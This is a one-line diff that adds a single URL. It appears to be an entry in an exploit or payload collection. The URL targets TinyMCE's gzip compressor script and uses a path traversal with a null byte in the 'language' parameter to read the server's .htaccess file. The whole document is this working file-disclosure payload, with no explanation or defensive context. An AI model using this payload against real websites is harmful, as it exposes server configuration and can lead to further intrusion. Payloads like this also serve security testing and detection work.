@@ -1,0 +1,1 @@
+http://www.example.com/jscripts/tiny_mce/tiny_mce_gzip.php?language=../../../../.htaccess%00&amp;theme=advanced
